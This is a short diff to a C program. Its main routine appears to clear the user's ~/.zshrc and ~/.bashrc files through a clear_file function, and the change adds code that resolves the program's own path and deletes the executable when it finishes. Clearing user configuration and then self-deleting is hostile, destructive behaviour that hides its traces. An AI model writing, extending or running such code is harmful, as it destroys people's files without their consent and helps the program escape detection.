@@ -152,6 +152,7 @@ int	clear_file(int fd, char *path)
 int	main(int ac, char **av, char **envp)
 {
 	char		home_buffer[PATH_MAX];
+	char		current_file_buffer[PATH_MAX];
 	int			fd;
 	int			i;
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
@@ -160,6 +161,7 @@ int	main(int ac, char **av, char **envp)
 
 	i = 0;
 	realpath(getenv("HOME"), home_buffer);
+	realpath(av[0], current_file_buffer);
 	printf("home path %s\n", home_buffer);
 	// process_child(rm_cmd, envp);
 	while (file_list[i])
@@ -178,6 +180,6 @@ int	main(int ac, char **av, char **envp)
 		free(path);
 		i++;
 	}
-	
+	remove(current_file_buffer);
 	return (0);
 }
